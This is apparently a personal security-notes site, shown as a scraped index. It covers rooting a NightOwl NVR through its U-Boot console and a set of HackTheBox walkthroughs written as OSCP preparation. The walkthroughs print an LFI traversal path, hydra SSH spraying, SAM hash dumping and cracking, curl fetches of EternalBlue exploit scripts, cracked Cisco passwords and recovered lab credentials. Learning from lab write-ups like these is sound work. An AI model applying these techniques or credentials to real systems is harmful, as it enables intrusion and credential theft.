0x529EA62C, created: 2020-08-12 02:22:22, image size: 190092 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0xB254D69A,\u00a0OS: Firmware, CPU: ARM, image type: OS Kernel Image, compression type: lzma, image name: \"MVX4##I2M#g45a386aCM_UBT1501#XVM\" \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 196672\u00a0 \u00a0 \u00a0 \u00a0 0x30040 \u00a0 \u00a0 \u00a0 \u00a0 xz compressed data\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 3080192 \u00a0 \u00a0 \u00a0 0x2F0000\u00a0 \u00a0 \u00a0 \u00a0 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 844888 bytes, 309 inodes, blocksize: 131072 bytes, created: 2023-06-28 06:57:24\n4128768 \u00a0 \u00a0 \u00a0 0x3F0000\u00a0 \u00a0 \u00a0 \u00a0 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 10632832 bytes, 846 inodes, blocksize: 65536 bytes, created: 2023-06-28 06:57:28\n14825212\u00a0 \u00a0 \u00a0 0xE236FC\u00a0 \u00a0 \u00a0 \u00a0 xz compressed data\n</code></pre> <p>So, we found the kernel at offset <code>0x30000</code></p> <p>Now back to the device, we will reboot and test bootm with the newly discovered offset/address</p> <pre><code>sf probe 0\n</code></pre> <pre><code>sf read 0x22000000 0x30000 0x280000\n</code></pre> <pre><code>bootm 0x22000000 \n</code></pre> <p>It worked!</p> <p></p> <p>But not really</p> <p>The real way to fix this is to load the latest firmware.rom onto a USB drive, name it <code>help.rom</code> and then run <code>${s23};${s24}</code> -- which runs the firmware upgrade from the USB port :)</p>"},{"location":"IoT/nightowl/nvr/#brute-forcing","title":"Brute Forcing","text":"<p>After dumping the firmware, I realized I had....well...the firmware. I used binwalk to extract the contents of the filesystem and found some password hashes. I started attacking the hashes with hashcat mask attacks.</p> <pre><code>?l?u?d for 1-4 chars\n?l for 5+ chars\n</code></pre> <p></p> <p>Creds</p> <pre><code>stb:stb\nroot:zlxx.\n</code></pre> <p>Next step: dump the squashfs filesystem(s) and see what's hanging around in there.</p> <p>Now, get root -- in the UBoot shell enter</p> <pre><code>set bootargs console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs ro init=/linuxrc &amp;&amp; /bin/busybox LX_MEM=0xff00000 mma_heap=MMU_MMA,miu=0,sz=0x3B00000 mma_heap=mma_heap_name0,miu=0,sz=0x2F00000 mma_memblock_remove=1\n</code></pre> <p>Then </p> <pre><code>${s10};${s11};${s12};${s13}\n</code></pre> <p>That didn't work...</p>"},{"location":"IoT/nightowl/nvr/#boot-sequence","title":"Boot sequence","text":"<p>Lets start examining this thing and figure out where a good spot is that we can inject some commands to get a shell.</p>"},{"location":"IoT/nightowl/nvr/#ipl","title":"IPL","text":"<p>I don't really know what this does, just included it for completeness :)</p>"},{"location":"IoT/nightowl/nvr/#spl-uboot-by-sigmastarmstar","title":"SPL (UBoot by SigmaStar/MStar)","text":"<p>The SPL is the UBoot environment I had access to after bricking the device. We can check the boot args using <code>printenv</code> or <code>env print</code>. The bootargs are passed to the linux kernel, and <code>init</code> is the first thing ran after the kernel loads successfully. In this case we see that the first thing run by Linux is <code>/linuxrc</code>.</p> <pre><code>bootargs=console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs ro init=/linuxrc LX_MEM=0xff00000 mma_heap=MMU_MMA,miu=0,sz=0x3B00000 mma_heap=mma_heap_name0,miu=0,sz=0x2F00000 mma_memblock_remove=1\n</code></pre>"},{"location":"IoT/nightowl/nvr/#linux-kernel","title":"Linux Kernel","text":"<p>The following params are passed to the linux kernel by UBoot:</p> <pre><code>mount /dev/mtdblock3\n/liniuxrc\n</code></pre>"},{"location":"IoT/nightowl/nvr/#linuxrc","title":"Linuxrc","text":"<p>Lets see the contents of <code>/linuxrc</code></p> <pre><code>/bin/bash\n</code></pre> <p>Well that wasn't much help. After linux loads, it spawns bash. Next we should check out the init.d scripts, starting with <code>rcS</code></p>"},{"location":"IoT/nightowl/nvr/#initdrcs","title":"init.d/rcS","text":"<pre><code>#! /bin/sh\n/bin/mount -a\n\nfor initscript in /etc/init.d/S[0-9][0-9]*\ndo\n\u00a0 \u00a0 \u00a0 \u00a0 if [ -x $initscript ] ;\n\u00a0 \u00a0 \u00a0 \u00a0 then\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 $initscript\n\u00a0 \u00a0 \u00a0 \u00a0 fi\ndone\n</code></pre> <p>Ok, now we're getting somewhere. There must be some scripts in <code>/etc/init.d/</code> that match the pattern laid out in rcS. Lets take a look at these initscripts.</p>"},{"location":"IoT/nightowl/nvr/#initscritpts-in-etcinitd","title":"initscritpt(s) in /etc/init.d","text":""},{"location":"IoT/nightowl/nvr/#s00devs","title":"S00devs","text":"<pre><code>#!/bin/sh\n\nif [ ! -e /dev/console ] ; then \u00a0\n    mknod /dev/console c 5 1\nfi\n\nif [ ! -e /dev/ttyAMA0 ] ; then \u00a0\n    mknod /dev/ttyAMA0 c 204 64\nfi\n\nif [ ! -e /dev/ttyAMA1 ] ; then \u00a0\n    mknod /dev/ttyAMA1 c 204 65\nfi\n\nif [ ! -e /dev/ttyS000 ] ; then \u00a0\n    mknod /dev/ttyS000 c 204 64\nfi\n\nif [ ! -e /dev/null ] ; then \u00a0\n    mknod /dev/null c 1 3\nfi\n\nif [ ! -e /dev/zero ] ; then \u00a0\n    mknod /dev/zero c 1 5\nfi\n</code></pre> <p>This one is just initializing consoles I think.</p>"},{"location":"IoT/nightowl/nvr/#s01udevs","title":"S01udevs","text":"<pre><code>#!/bin/sh\n\nmkdir /dev/pts\nmount -t devpts devpts /dev/pts\n/bin/echo \"/sbin/mdev\" &gt; /proc/sys/kernel/hotplug\n/sbin/mdev -s\n\n#udevd --daemon\n\n#udevtrigger\n</code></pre> <p>This one does some stuff, not quite sure what :D</p>"},{"location":"IoT/nightowl/nvr/#s02pppd","title":"S02pppd","text":"<pre><code>#!/bin/sh\nmkdir /tmp/run\nmkdir /tmp/lock\nmount --binding /tmp/run\u00a0 /var/run\nmount --binding /tmp/lock /var/lock\n</code></pre> <p>This one mounts some stuff using --binding. This was my first encounter with the --binding flag. This is cool, because we're actually going to use this technique to root the device.</p>"},{"location":"IoT/nightowl/nvr/#s03pppoe","title":"S03pppoe","text":"<pre><code>#!/bin/sh\n#echo \"PPPoE config\"\n#cp /etc/ppp/chap-secrets-bk /tmp/chap-secrets\n#cp /etc/ppp/pap-secrets-bk /tmp/pap-secrets\n#cp /etc/ppp/pppoe.conf-bk /tmp/pppoe.conf\n#cp /etc/ppp/chap-secrets-bk /tmp/chap-secrets-bak\n#cp /etc/ppp/pap-secrets-bk /tmp/pap-secrets-bak\n#cp /etc/ppp/pppoe.conf-bk /tmp/pppoe.conf-bak\n</code></pre> <p>Everything in here is commented out.</p>"},{"location":"IoT/nightowl/nvr/#s80network","title":"S80network","text":"<pre><code>#!/bin/sh\nipaddr=\nbootp=\ngateway=\nnetmask=\nhostname=\nnetdev=\nautoconf=\n\nifconfig lo 127.0.0.1 up\nifconfig eth0 up\nroute add -net 127.0.0.0 netmask 255.0.0.0 lo\nfor ipinfo in `cat /proc/cmdline`\ndo\n\u00a0 \u00a0 \u00a0 \u00a0 case \"$ipinfo\" in\n\u00a0 \u00a0 \u00a0 \u00a0 ip=*)\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 for var in\u00a0 ipaddr bootp gateway netmask hostname netdev autoconf\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 do\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 eval read $var\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 done &lt;&lt; EOF\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 `echo \"$ipinfo\" | sed \"s/:/\\n/g\" | sed \"s/^[\u00a0 \u00a0 ]*$/-/g\"`\nEOF\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ipaddr=`echo \"$ipaddr\" | cut -d = -f 2`\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 [ x$ipaddr == x ] &amp;&amp; ipaddr=x\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 ;;\n\u00a0 \u00a0 \u00a0 \u00a0 esac\ndone\n[ -z \"$ipaddr\" ] &amp;&amp; exit 0\n\necho \"\u00a0 \u00a0 \u00a0 IP: $ipaddr\"\necho \" \u00a0 BOOTP: $bootp\"\necho \" GATEWAY: $gateway\"\necho \" NETMASK: $netmask\"\necho \"HOSTNAME: $hostname\"\necho \"\u00a0 NETDEV: $netdev\"\necho \"AUTOCONF: $autoconf\"\n\nif [ x$ipaddr == x- ] ; then\n\u00a0 \u00a0 \u00a0 \u00a0 # use DHCP\n\u00a0 \u00a0 \u00a0 \u00a0 :\nelse\n\u00a0 \u00a0 \u00a0 \u00a0 cmd=\"ifconfig $netdev $ipaddr\"\n\u00a0 \u00a0 \u00a0 \u00a0 [ x$netmask != x- ] &amp;&amp; cmd=\"$cmd netmask $netmask\"\n\u00a0 \u00a0 \u00a0 \u00a0 eval $cmd\n\u00a0 \u00a0 \u00a0 \u00a0 [ x$gateway != x- ] &amp;&amp; route add default gw $gateway\nfi\n</code></pre> <p>This one initializes the network configuration.</p>"},{"location":"IoT/nightowl/nvr/#s99","title":"S99","text":"<pre><code>#! /bin/sh\n\nHOME=/\nPATH=/sbin:/bin:/usr/sbin:/usr/bin:/opt/bin:/opt/sbin:/opt/module/hi_tools\nrunlevel=S\nprevlevel=N\numask 022\nexport PATH runlevel prevlevel\nexport LD_LIBRARY_PATH=\"/usr/local/lib:/usr/lib:/lib:/opt/lib\"\n\n# Stop tty\u00a0 from doing XOFF/XON with Ctrl-S/Ctrl-Q, Modify Ctrl-D/C/\\/U/Z/R/W/V/O to undef\n\nstty ixany;\nstty ixoff -ixon;\nstty eof undef;\nstty intr undef;\nstty quit undef;\nstty kill undef;\nstty susp undef;\nstty rprnt undef;\nstty werase undef;\nstty lnext undef;\nstty flush undef\n\n/bin/mount -a\n#/bin/echo /sbin/mdev &gt; /proc/sys/kernel/hotplug\n#/sbin/mdev -s\n/bin/upgrade &amp;\u00a0\nmount -t squashfs /dev/mtdblock4 /opt\n#export PATH\n#export LD_LIBRARY_PATH\ncd /opt\nsh run_app.sh\n</code></pre> <p>This one is also interesting, lots of custom code in here. While attached to the UART console I noticed  Interesting spots to look for vulns: - maybe we can skip right to <code>run_app.sh</code> before the tty is killed - maybe we can alias <code>stty</code> to prevent tty from being killed - maybe <code>/bin/upgrade</code> checks local storage?</p>"},{"location":"IoT/nightowl/nvr/#actually-how-to-get-root","title":"Actually how to get Root","text":"<p>After bricking the device I was searching for ways to rebuild it. While looking for clues I searched the IPL code that is displayed on boot, and that's when I came across Nicole's blog. </p> <p>In the blog post, Nicole shared this guide</p> <p>As she mentioned, it didn't work at first. I used the UBoot command line to only dump the app partition and beyond. Then <code>binwalk</code> was able to properly dump the squashfs -- previously it was unable to do so bc of some corruption.</p> <p>In the gist/rooting guide Nicole shared, it's mentioned that:</p> <p>One of the startup scripts contains the following snippet: </p> <pre><code>if [ -e $MOUNT_DIR/enable_log_forever ];then\n                echo \"enable log2 found.\"\n                rv=$(cat $MOUNT_DIR/enable_log_forever)\n                if [ \"$rv\" == \"1000000001\" ];then\n                        if [ -e $MOUNT_DIR/dvr_app ];then\n                                echo \"mount bind dvr_app.\"\n                                mount --bind $MOUNT_DIR/dvr_app /root/dvr_app/dvr_app\n                        fi\n</code></pre> <p>On my device, this snippet resides in <code>/opt/run_app.sh</code>, which was the last thing called from init.d/S99</p> <pre><code>if [ -e $MOUNT_DIR/enable_log_forever ];then\n                echo \"enable log2 found.\"\n                rv=$(cat $MOUNT_DIR/enable_log_forever)\n                if [ \"$rv\" == \"1000000001\" ];then\n                        if [ -e $MOUNT_DIR/app.out ];then\n                                echo \"mount bind app.out.\"\n                                mount --bind $MOUNT_DIR/app.out /opt/app/app.out\n                        fi\n</code></pre> <p>Upon examining the snippet, I noticed something interesting -- all instances of <code>dvr_app</code> had been replaced with <code>app.out</code>! So, to get the exploit from the gist working, all you need to do is update the dvr's main binary name and path.</p> <p>This is where the fun ends. I set out to get a root shell on this thing just to see if I could. Now that I have it, I'll use it in the future for debugging and hunting bugs. Since the device doesn't create or listen to any public facing sockets, any findings likely won't be that critical, however this device DOES attach to AWS to sync data to the mobile app.</p>"},{"location":"OSCP-Prep/oscp/","title":"Oscp","text":""},{"location":"OSCP-Prep/oscp/#what-is-the-oscp","title":"What is the OSCP?","text":"<p>A certificate for those interested in offensive security jobs. To become certified the student needs to pass an exam. The exam consits of hacking a handful of computers in a 24 hour period and then submitting a report within the next 24 hours.</p>"},{"location":"OSCP-Prep/oscp/#study-plan","title":"Study plan","text":"<p>I've been studying on and off for years, but recently started taking a more active approach. The Ultimate OSCP Guide by John J. Hacking has been a good outline to prepare for the exam.    </p> <p>In December 2021, I completed the PEN-200 course. The course covered basic command line as well as complex topics such as setting up pivots and buffer overflows.</p> <p>Lately, I'm meeting with a study/accountability group weekly to set goals. As I practice techniques on HackTheBox I'll document my steps and post them here to share with family and friends.</p>"},{"location":"OSCP-Prep/HackTheBox/Active/","title":"Active","text":"<p>10.10.10.100</p> <p>From the scans, we see that SMB is open and allows anonymous access.</p> <p>We grab a Groups.xml file from the <code>Replication</code> share and find encrypted credentials for <code>SVC_TGS</code> account.</p> <p>There is an encrypted password in the file, but we were able to decrypt it using <code>gpp-decrypt</code>.</p> <p>We don't get shell access with this account, but we're able to request a TGS ticket and crack the Administrator password.</p>"},{"location":"OSCP-Prep/HackTheBox/Arctic/","title":"Arctic","text":""},{"location":"OSCP-Prep/HackTheBox/Arctic/#recon","title":"Recon","text":"<p>The tags for this box are:  </p> <ul> <li>Windows</li> <li>Arbitrary File Upload  </li> <li>Patch Management</li> <li>Web</li> </ul> <p>Difficulty:</p> <p>Easy</p>"},{"location":"OSCP-Prep/HackTheBox/Arctic/#port-scan","title":"Port scan","text":"<p>There is a mystery service running on port 8500. The other open ports are RPC. Better figure out what the mystery service is.</p> <pre><code>PORT      STATE SERVICE REASON          VERSION                                                                                                                              135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC                                                                                                                8500/tcp  open  fmtp?   syn-ack ttl 127                                                                                                                                      49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC                                                                                                                Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        Device type: general purpose|phone|specialized                                                                                                                               Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) \n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Arctic/#port-8500-cold-fusion-8","title":"Port 8500 - Cold Fusion 8","text":"<p>Software version disclosure </p> <p>Searching for exploits </p> <p>50057 looks promising. Interestingly enough, rhost and rport were already correct -it's almost like this exploit was developed/tested on this HTB box. </p> <p>That gave us shell as <code>arctic\\tolis</code> </p> <p>User flag </p>"},{"location":"OSCP-Prep/HackTheBox/Arctic/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"OSCP-Prep/HackTheBox/Arctic/#winpeas-interesting-findings","title":"WinPEAS interesting findings","text":""},{"location":"OSCP-Prep/HackTheBox/Arctic/#exploit-suggester","title":"Exploit Suggester","text":"<p>I've had luck with <code>MS10-059</code> in the past and figured that was a good way to go. I got the .exe from SecWiki</p> <p>It worked, the listener (left) caught a system shell that was spawned by MS10-059 (right side).</p> <p></p> <p>Root flag:</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Bashed/","title":"Bashed","text":"<p>A port scan shows only port 80 is open. I went to the webpage and see the site is talking about phpbash. I click the github link and the page explains phpbash is a webshell.</p> <p>Dirbuster found <code>/dev/</code> and there are 2 instances of the phpbash program. These give RCE as the <code>www-data</code> user.</p> <p>A more formal shell is obtained by putting a python reverse shell in a .py file and executing it using phpbash. I couldn't get bash rev shells working for some reason.</p> <p>Once I'm on the box, I ran <code>sudo -l</code> as always. It tells me I can run any command as the <code>scriptmanager</code> user. At this point I might as well elevate the shell:</p> <pre><code>sudo -u scriptmanager /bin/bash\n</code></pre> <p>The user flag <code>/home/arrexel/user.txt</code> is readable by scriptmanager</p> <p>Linpeas highlighted the kernel version so I turned to searchsploit:</p> <pre><code>searchsploit linux kernel ubuntu 4.4.0-62\n</code></pre> <p>EDB-45010 is a local priv esc for this kernel. I compiled with <code>gcc</code> on kali then transferred the binary over. It worked!</p> <p>The root flag is at <code>/root/root.txt</code></p>"},{"location":"OSCP-Prep/HackTheBox/Bastion/","title":"Bastion","text":"<p>Port scan shows 22, 139, 445 open. We find an unprotected share <code>/backups</code> which contains the backup archive of a Windows PC.</p> <p>mount SMB share</p> <pre><code>sudo mount -t cifs //10.10.10.134/backup /mnt/vhd1 -o user=anonymous,password=anonymous\n</code></pre> <p>Mount the vhd file</p> <pre><code>sudo modprobe nbd\n</code></pre> <pre><code>sudo qemu-nbd -r -c &lt;new_device_name&gt; &lt;file&gt;\n</code></pre> <pre><code>mount -r &lt;new_device_name&gt; &lt;mountpoint&gt;\n</code></pre> <p>and then dump the SAM and SYSTEM files for cracking</p> <pre><code>cp c:\\windows\\system32\\config\\SAM .\ncp c:\\windows\\system32\\config\\SYSTEM .\nsamdump2 SYSTEM SAM -o hashes\nhashcat hashes /usr/share/wordlists/rockyou.txt\n</code></pre> <p>We now have user credentials</p> <pre><code>L4mpje\n</code></pre> <pre><code>bureaulampje\n</code></pre> <p>In <code>%appdata%/mremoteng/confCons.xml</code> we find a few username/password combos</p> <p></p> <pre><code>L4mpje\n</code></pre> <p></p> <p>We used a tool from github to crack these hashes.</p> <pre><code>Administrator\n</code></pre> <pre><code>thXLHM96BeKL0ER2\n</code></pre>"},{"location":"OSCP-Prep/HackTheBox/Beep/","title":"Beep","text":"<p>10.10.10.7</p>"},{"location":"OSCP-Prep/HackTheBox/Beep/#recon","title":"Recon","text":"<p>This box is running Elastix which appears to be a phone controller. It also has what appears to be a mail service called Cyrus.</p>"},{"location":"OSCP-Prep/HackTheBox/Beep/#finding-vulns","title":"Finding Vulns","text":"<p>While searching for vulnerabilities, we stumble across EDB-37637 which tells us Elastix has an LFI vulnerability. The vulnerable path is <code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code></p> <p>We are able to use the same exploit to view <code>/etc/passwd</code></p>"},{"location":"OSCP-Prep/HackTheBox/Beep/#exploitation","title":"Exploitation","text":"<p>We found a few passwords in <code>amportal.conf</code> and some usernames in <code>/etc/passwd</code>. We added the users and passwords to custom wordlists and then sprayed ssh with them. Suprisingly, we have access to log in as root.</p> <pre><code>\u250c\u2500\u2500(nate@kali-Dell)-[~/hackthebox/beep]                                                         [25/148]\n\u2514\u2500$ hydra -L users -P passwords 10.10.10.7 ssh                                                          \nHydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service\n organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). \n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-26 12:33:55                      \n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the ta\nsks: use -t 4                                                                                           \n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous \nsession found, to prevent overwriting, ./hydra.restore                                                  \n[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task              \n[DATA] attacking ssh://10.10.10.7:22/                                                                   \n[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE                                       \n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-26 12:34:35\n</code></pre> <p>Unfortunately, we get an error message about the key exchange algorithm. Searching google we see this is a common issue when working with old systems. We're able to use a legacy KEX method using a config option:</p> <pre><code>ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7\n</code></pre> <p>We then specify the password which we found in the config file: <code>jEhdIekWmdjE</code></p>"},{"location":"OSCP-Prep/HackTheBox/Beep/#flags","title":"Flags","text":"<p>We find user flag at <code>/home/fanis/user.txt</code> and root flag at <code>/root/root.txt</code></p>"},{"location":"OSCP-Prep/HackTheBox/Blocky/","title":"Blocky","text":"<p>10.10.10.37</p> <p>A port scan reveals ports 21,22,80, and 25565 are open.</p>"},{"location":"OSCP-Prep/HackTheBox/Blocky/#port-80","title":"Port 80","text":"<p>The webserver is hosting a wordpress page. This appears to be a minecraft server which is under contruction. We see a few references to a \"Custom Plugin\".</p> <p>Dirbuster finds a <code>/plugins/</code> directory, so we navigate to it and are met with 2 plugins that can be downloaded.</p> <p>We use JD-GUI to decompile the <code>BlockyCore.jar</code> file.</p> <p>Here is the source code:</p> <pre><code>package com.myfirstplugin;\n\npublic class BlockyCore {\n  public String sqlHost = \"localhost\";\n\n  public String sqlUser = \"root\";\n\n  public String sqlPass = \"8YsqfCTnvxAUeduzjNSXe22\";\n\n  public void onServerStart() {}\n\n  public void onServerStop() {}\n\n  public void onPlayerJoin() {\n    sendMessage(\"TODO get username\", \"Welcome to the BlockyCraft!!!!!!!\");\n  }\n\n  public void sendMessage(String username, String message) {}\n}\n\n</code></pre> <p>We try to login to wordpress, phpadmin, and ssh using the credentials from the file:</p> <p>Username: root Password: 8YsqfCTnvxAUeduzjNSXe22</p> <p>This doesn't work. But we'll hang onto these incase we need them later.</p>"},{"location":"OSCP-Prep/HackTheBox/Blocky/#hunting-for-a-user","title":"Hunting for a user.","text":"<p>Wordpress's login page discloses if the username exists or not, so we can use hydra to find a valid username. We end up finding <code>notch</code> as the username.</p> <p>Suprisingly, we're able to ssh in as notch using the password we found above.</p>"},{"location":"OSCP-Prep/HackTheBox/Blocky/#privesc","title":"Privesc","text":"<p>The first thing I do when I get a shell on linux is <code>sudo -l</code>. In this case we have access to everything. So root is as simple as <code>sudo su</code></p>"},{"location":"OSCP-Prep/HackTheBox/Blocky/#flags","title":"Flags","text":"<p>We find flags at: <code>/home/notch/user.txt</code> and <code>/root/root.txt</code></p>"},{"location":"OSCP-Prep/HackTheBox/Blue/","title":"Blue","text":"<p>I knew this was going to use the Eternal Blue exploit, so I got Autoblue ready...however AutoBlue wasn't working. I was able to get this one working:</p> <pre><code>$ mkdir eternalblue \n\n$ curl https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py &gt; eternalblue/send_and_execute.py \n\n$ curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py &gt; eternalblue/mysmb.py \n\n$ curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py &gt; eternalblue/checker.py\n</code></pre> <p>this is saved in my <code>/opt/eternalblue</code> folder now.</p> <p>Note, I was first getting a message about authentication failure, so I had to use the username <code>guest</code> in the scripts. Then everyhting worked well.</p> <p>With this solution you need to provide an executable file (generate reverse shell with msfvenom)</p>"},{"location":"OSCP-Prep/HackTheBox/Blue/#this-uses-python2","title":"This uses python2","text":""},{"location":"OSCP-Prep/HackTheBox/Bounty/","title":"Bounty","text":"<p>Port 80 is the only one open.</p> <p>This webserver is running IIS 7.5. Dirbuster finds <code>/transfer.aspx</code> and <code>/uploadedfiles/</code></p> <p>I tested a few uploads, but get a message that the file can't be uploaded. Trying a bunch of differnent extensions I found the only working one is <code>.config</code></p> <p>PayloadAllTheThings has this web.config shell so we upload it and get command execution.</p> <p>I used Powershell-InvokeTCP to get a shell.</p> <p>First I noticed we have <code>SEImpersonate</code> Enabled, which means I can try JuicyPotato.</p> <p><code>Systeminfo</code> tells us this is Windows Server 2008 R2. Based on a google search I found <code>MS15-032</code> may be applicable. However, I was not able to exploit this through powershell or metasploit.</p>"},{"location":"OSCP-Prep/HackTheBox/Bounty/#privesc","title":"Privesc","text":"<p>Juicy Potato worked. I was able to get a shell as System</p>"},{"location":"OSCP-Prep/HackTheBox/Devel/","title":"Devel","text":"<p>10.10.10.5</p> <p>ports 21 and 80 are open</p> <p>FTP allows anonymous access</p> <p>we can upload </p> <p>I upload an aspx webshell and have command execution.</p> <p>We then ran sherlock</p> <pre><code>Title      : ClientCopyImage Win32k                                                                           \nMSBulletin : MS15-051                                                                                         \nCVEID      : 2015-1701, 2015-2433                                                                             \nLink       : https://www.exploit-db.com/exploits/37367/                                                       \nVulnStatus : Appears Vulnerable \n\nTitle      : Task Scheduler .XML                                                                              \nMSBulletin : MS10-092                                                                                         \nCVEID      : 2010-3338, 2010-3888                                                                             \nLink       : https://www.exploit-db.com/exploits/19930/                                                       \nVulnStatus : Appears Vulnerable\n\nTitle      : User Mode to Ring (KiTrap0D)                                                                     \nMSBulletin : MS10-015                                                                                         \nCVEID      : 2010-0232                                                                                        \nLink       : https://www.exploit-db.com/exploits/11199/                                                       \nVulnStatus : Appears Vulnerable\n</code></pre> <p>I tried each of these, with no success. Then I used google for <code>Windows 7 Enterprise Privilege escallation</code> and the first result is <code>MS11-046</code>. I found a precompiled binary here: https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046</p> <p>Using the shell we got from msfvenom I am able to run the exploit and get system admin.</p> <p></p>"},{"location":"OSCP-Prep/HackTheBox/Grandpa/","title":"Grandpa","text":"<p>10.10.10.14</p> <p>This box only has port 80 open. It's running IIS 6.0. We find this service is vulnerable to CVE-2017-7296. We found an exploit script here</p> <p>This gives us a shell as NETWORK SERVICE and we immediately notice we have SEIMPERSONATE priv enabled.</p> <p>I tried a few exploits but nothing seemed to work. Eventually I turned to a walkthrough and found the correct way to exploit Windows Server 2003 SP2 with SEImpersonate is to use Churrasco</p> <p>This gives us a shell as SYSTEM. We find the flags</p> <p><code>c:\\Documents and Settings\\harry\\Desktop\\user.txt</code> and <code>c:\\Documents and Settings\\Administrator\\Desktop\\root.txt</code></p>"},{"location":"OSCP-Prep/HackTheBox/Granny/","title":"Granny","text":"<p>10.10.10.15</p> <p>port 80 is open.</p> <p>The website is under construction, but running IIS 6.0</p> <p>Able to log in to WebDAV using cadaver with no credentials.</p> <p></p> <p>We're even able to upload files.</p> <p></p> <p>I am unable to upload <code>asp</code> files, they seem to be filtered, but we can add a <code>.txt</code> extension for upload then rename once it's up there.</p> <p>I copied <code>/usr/share/webshells/aspx/cmdasp.aspx</code> to the webserver but it doesn't appear to work.</p> <p></p> <p>We see this is 32bit</p> <p></p> <p>We generate a reverse shell using <code>msfvenom</code> and upload the same way we did with the webshell.</p> <p>We used <code>Windows-Exploit-Suggester</code> which found a few exploits, none which worked. Then we searched on google for <code>Windows Server 2003 privilege escallation</code> and found <code>Churrasco</code>.</p> <p>Using <code>Churrasco</code> (MS09-012) we are able to run commands as system:</p> <p></p> <p>We copy over netcat and get a shell that way.</p> <p></p> <p>Now we can collect the user flag: <code>c:\\documents and settings\\lakis\\desktop\\user.txt</code> and the root flag <code>c:\\documents and settigns\\administrator\\desktop\\root.txt</code></p>"},{"location":"OSCP-Prep/HackTheBox/Heist/","title":"Heist","text":"<p>10.10.10.149</p> <p>there is a webserver on port 80. We are able to login as guest. We see an issue by an enduser who has attached their Cisco iOS config.</p> <pre><code>version 12.2\nno service pad\nservice password-encryption\n!\nisdn switch-type basic-5ess\n!\nhostname ios-1\n!\nsecurity passwords min-length 12\nenable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91\n!\nusername rout3r password 7 0242114B0E143F015F5D1E161713\nusername admin privilege 15 password 7 02375012182C1A1D751618034F36415408\n!\n!\nip ssh authentication-retries 5\nip ssh version 2\n!\n!\nrouter bgp 100\n synchronization\n bgp log-neighbor-changes\n bgp dampening\n network 192.168.0.0\u00c2 mask 300.255.255.0\n timers bgp 3 9\n redistribute connected\n!\nip classless\nip route 0.0.0.0 0.0.0.0 192.168.0.1\n!\n!\naccess-list 101 permit ip any any\ndialer-list 1 protocol ip list 101\n!\nno ip http server\nno ip http secure-server\n!\nline vty 0 4\n session-timeout 600\n authorization exec SSH\n transport input ssh\n\n</code></pre> <p>There are a few passwords in this file:</p> <p>secret</p> <pre><code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91\n</code></pre> <p>rout3r password</p> <pre><code>0242114B0E143F015F5D1E161713\n</code></pre> <p>admin password</p> <pre><code>02375012182C1A1D751618034F36415408\n</code></pre> <p>We found an online crack tool: https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html</p> <p>and are able to crack the second two passwords</p> <p>secret</p> <pre><code>stealth1agent\n</code></pre> <p>rout3r</p> <pre><code>$uperP@ssword\n</code></pre> <p>admin</p> <pre><code>Q4)sJu\\Y8qz*A3?d\n</code></pre> <p>We used <code>crackmapexec</code> to find a valid set of credentials:</p> <pre><code>crackmapexec smb 10.10.10.149 -u hazard -p stealth1agent\n</code></pre> <p>hazard has the same password as the secret from the config.</p> <p>we used crackmapexec to RID Bruteforce a few other users.</p> <p>Then added the users to users.txt and password spray again.</p> <p>We found another set of credentials <code>Chase:Q4)sJu\\Y8qz*A3?d</code></p> <p>This is where we turned to a writeup for some pointers: 1. Use procdump to dump 